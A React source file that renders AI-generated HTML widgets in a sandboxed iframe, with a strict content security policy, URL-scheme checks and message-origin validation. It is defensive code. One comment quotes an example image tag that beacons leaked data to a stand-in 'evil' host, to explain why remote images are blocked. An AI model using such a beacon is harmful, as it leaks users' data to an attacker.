import { useRef, useEffect, useState, useMemo, Component } from 'react'

// SECURITY-CRITICAL. Model-authored HTML/SVG is rendered ONLY inside an isolated,
// null-origin iframe - never via dangerouslySetInnerHTML / innerHTML into our DOM.
// Do not "simplify" the sandbox flags, the CSP, or the source-identity check below;
// each is load-bearing (see the notes at the bottom of this file).

const CDN = [
  'https://cdnjs.cloudflare.com',
  'https://cdn.jsdelivr.net',
  'https://unpkg.com',
  'https://esm.sh',
]

const CSP = [
  "default-src 'none'",
  // data: only (NOT https:) so a model/DB-authored <img src="https://evil/?leak=">
  // can't beacon data out - the one remaining exfil channel once connect-src is
  // locked to the CDNs. Charts/dashboards use canvas + data URIs, not remote images.
  'img-src data:',
  "style-src 'unsafe-inline' https://fonts.googleapis.com",
  'font-src https://fonts.gstatic.com data:',
  `script-src 'unsafe-inline' ${CDN.join(' ')}`,
  `connect-src ${CDN.join(' ')}`,
].join('; ')

// Brand tokens. ONLY the :root hex values are meant to be edited - they're tuned to
// the Aastha assistant's blue accent so every widget matches the product.
// THEME: the GlowStar app is LIGHT-ONLY, so widgets are ALWAYS light — there is
// deliberately NO prefers-color-scheme fallback (that OS-driven dark path was the
// bug: on a dark-mode machine the widget went black while the app stayed light,
// hiding the white title on the white page). Dark is reachable ONLY if the host
// explicitly stamps <html data-theme="dark"> (kept dormant for a future app dark
// mode). Everything else (sandbox flags, CSP, message identity check) stays as-is.
const DARK_VARS = `
  --surface-2:#1a1a19; --surface-1:#242422; --surface-0:#2c2c2a;
  --text-primary:#fff; --text-secondary:#c3c2b7; --text-muted:#898781;
  --border:rgba(255,255,255,.1); --border-strong:rgba(255,255,255,.18);
  --bg-accent:#42330f; --text-accent:#e6b85f; --border-accent:#8a5a12;
  --bg-success:#0d3a25; --text-success:#7bd0a4; --border-success:#0a7d44;
  --bg-warning:#473408; --text-warning:#e6c878; --border-warning:#8a6310;
  --bg-danger:#4a1716; --text-danger:#e89b99; --border-danger:#b0322f;
`
const TOKENS = `
:root{
  --surface-2:#fcfcfb; --surface-1:#f4f3ef; --surface-0:#eeede8;
  --text-primary:#0b0b0b; --text-secondary:#52514e; --text-muted:#898781;
  --border:rgba(11,11,11,.1); --border-strong:rgba(11,11,11,.18);
  --bg-accent:#F1EAFE; --text-accent:#8B5CF6; --border-accent:#C9B6F5;
  --bg-success:#e4f3ea; --text-success:#0a7d44; --border-success:#86c9a4;
  --bg-warning:#fbf0d8; --text-warning:#8a6310; --border-warning:#e6c878;
  --bg-danger:#fbe6e6; --text-danger:#b0322f; --border-danger:#e89b99;
  --radius:8px;
  --pad-sm:8px; --pad-md:16px; --pad-lg:24px;
  --gap-xs:4px; --gap-sm:8px; --gap-md:12px; --gap-lg:20px;
  --font-sans:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;
  --font-voice:Georgia,'Times New Roman',serif;
  --font-mono:ui-monospace,SFMono-Regular,Menlo,monospace;
}
/* Dark ONLY when the host explicitly asks for it. No prefers-color-scheme rule
   exists, so a dark-mode OS can never flip a widget dark on this light app. */
:root[data-theme="dark"]{${DARK_VARS}}
body{margin:0;padding:0;background:transparent;color:var(--text-primary);
  font-family:var(--font-sans);line-height:1.7;font-size:16px;}
h1{font-size:22px;font-weight:500;} h2{font-size:18px;font-weight:500;}
h3{font-size:16px;font-weight:500;}
.sr-only{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);
  white-space:nowrap;border:0;padding:0;margin:-1px;}
`

// Only these URL schemes may be opened from a widget. A model- or DB-authored
// widget could emit <a href="javascript:...">; opening that via window.open
// executes in the PARENT (CRM) origin, defeating the whole sandbox. Reject
// anything that isn't a plain navigable web/mail link.
function isSafeUrl(u) {
  try {
    const p = new URL(String(u), window.location.href).protocol
    return p === 'http:' || p === 'https:' || p === 'mailto:'
  } catch {
    return false
  }
}

// Hard ceiling on the iframe height a widget can request (a hostile/broken
// widget could otherwise report a gigantic scrollHeight and wedge the page).
const MAX_WIDGET_HEIGHT = 20000

function buildSrcDoc(code, theme = 'light') {
  // The model's fragment is dropped between TOKENS and the bridge script. The host
  // page (parent) is never modified; only this isolated document holds the code.
  // data-theme forces the widget to match the app's theme (see TOKENS).
  const t = theme === 'dark' ? 'dark' : 'light'
  return `<!doctype html><html data-theme="${t}"><head>
<meta charset="utf-8">
<meta name="color-scheme" content="${t}">
<meta http-equiv="Content-Security-Policy" content="${CSP}">
<script>
/* Registered BEFORE the widget code so even its syntax errors are caught.
   capture:true also catches failed resource loads (blocked/missing CDN). */
window.addEventListener("error", function(e){
  var msg = e && e.message ? String(e.message)
    : (e && e.target && e.target.src ? "Failed to load: " + e.target.src : "Script error");
  try { parent.postMessage({source:"widget", type:"error", message: msg}, "*"); } catch(_) {}
}, true);
<\/script>
<style>${TOKENS}</style></head><body>
${code}
<script>
(function(){
  // sendPrompt drives a full backend agent turn, so it must follow a REAL user
  // action - otherwise a widget's auto-running load script could fire prompts in
  // a loop and drive the agent autonomously. Require a trusted (isTrusted) user
  // gesture inside the frame first; synthetic events don't count.
  var userActivated = false;
  function activate(e){ if(e && e.isTrusted) userActivated = true; }
  document.addEventListener("pointerdown", activate, true);
  document.addEventListener("keydown", activate, true);
  function safeScheme(u){ return /^(https?:|mailto:)/i.test(String(u)); }
  function send(t){
    if(!userActivated) return;  // ignore prompts with no preceding user gesture
    parent.postMessage({source:"widget",type:"prompt",text:String(t)},"*");
  }
  window.sendPrompt = send;
  window.openLink = function(u){
    if(!safeScheme(u)) return;  // defense in depth: no javascript:/data: links
    parent.postMessage({source:"widget",type:"link",url:String(u)},"*");
  };
  document.addEventListener("click",function(e){
    var a = e.target.closest && e.target.closest("a[href]");
    if(a){ e.preventDefault(); window.openLink(a.href); }
  });
  function report(){
    parent.postMessage({source:"widget",type:"height",
      height: Math.ceil(document.documentElement.scrollHeight)},"*");
  }
  if(window.ResizeObserver){ new ResizeObserver(report).observe(document.body); }
  window.addEventListener("load", report);
  setTimeout(report, 60); setTimeout(report, 400);
})();
<\/script></body></html>`
}

export function SandboxedWidget({ code, onPrompt, onLink, minHeight = 80, theme = 'light' }) {
  const ref = useRef(null)
  const [height, setHeight] = useState(minHeight)
  const [scriptError, setScriptError] = useState(null)
  const srcDoc = useMemo(() => buildSrcDoc(code, theme), [code, theme])

  useEffect(() => {
    function onMsg(e) {
      // Origin is "null" (sandboxed) - validate by SOURCE IDENTITY, NOT origin string.
      if (!ref.current || e.source !== ref.current.contentWindow) return
      const d = e.data
      if (!d || d.source !== 'widget') return
      if (d.type === 'height' && typeof d.height === 'number') {
        setHeight(Math.min(MAX_WIDGET_HEIGHT, Math.max(minHeight, d.height)))
      } else if (d.type === 'prompt') {
        onPrompt?.(d.text)
      } else if (d.type === 'link') {
        // Never open a javascript:/data:/blob: URL - only real web/mail links.
        if (isSafeUrl(d.url)) {
          onLink ? onLink(d.url) : window.open(d.url, '_blank', 'noopener,noreferrer')
        }
      } else if (d.type === 'error') {
        setScriptError(d.message || 'Script error')
      }
    }
    window.addEventListener('message', onMsg)
    return () => window.removeEventListener('message', onMsg)
  }, [onPrompt, onLink, minHeight])

  return (
    <>
      <iframe
        ref={ref}
        title="widget"
        /* allow-scripts WITHOUT allow-same-origin = null origin (cannot read parent
           cookies / localStorage / DOM). NEVER add allow-same-origin. */
        sandbox="allow-scripts"
        srcDoc={srcDoc}
        style={{ width: '100%', height, border: 'none', display: 'block', colorScheme: 'normal' }}
      />
      {/* Never show a silent blank box: if the widget's script failed, say so. */}
      {scriptError && (
        <div className="widget-error">⚠️ This visual failed to render ({scriptError})</div>
      )}
    </>
  )
}

// Error boundary so a malformed widget degrades to a "couldn't render" note with
// the raw code, instead of crashing the whole chat thread.
class WidgetErrorBoundary extends Component {
  constructor(props) {
    super(props)
    this.state = { failed: false }
  }
  static getDerivedStateFromError() {
    return { failed: true }
  }
  render() {
    if (this.state.failed) {
      return (
        <details className="widget-fallback">
          <summary>⚠️ Couldn't render this widget</summary>
          <pre>{this.props.code}</pre>
        </details>
      )
    }
    return this.props.children
  }
}

// Public entry point: an error-boundaried widget. Use this from the chat renderer.
// theme defaults to 'light' to match the app (which is light-only); pass 'dark'
// if/when the app gains a dark mode, so widgets always track the app, not the OS.
export function Widget({ code, title, onPrompt, onLink, theme = 'light' }) {
  return (
    <div className="widget" data-title={title}>
      <WidgetErrorBoundary code={code}>
        <SandboxedWidget code={code} onPrompt={onPrompt} onLink={onLink} theme={theme} />
      </WidgetErrorBoundary>
    </div>
  )
}

// Why the specifics (so they don't get "simplified" away):
// - sandbox="allow-scripts" and NOT allow-same-origin -> null origin. The frame runs
//   JS but cannot read the parent's cookies, localStorage, or DOM. Adding
//   allow-same-origin defeats the entire isolation - never add it.
// - The meta CSP caps which hosts the frame's scripts/fonts/connections can reach.
// - Because the origin is null, inbound postMessage is validated by
//   e.source === contentWindow (identity), not by an origin allowlist string.
// - Height auto-sizing comes from the frame reporting scrollHeight; without it the
//   iframe is a fixed box.
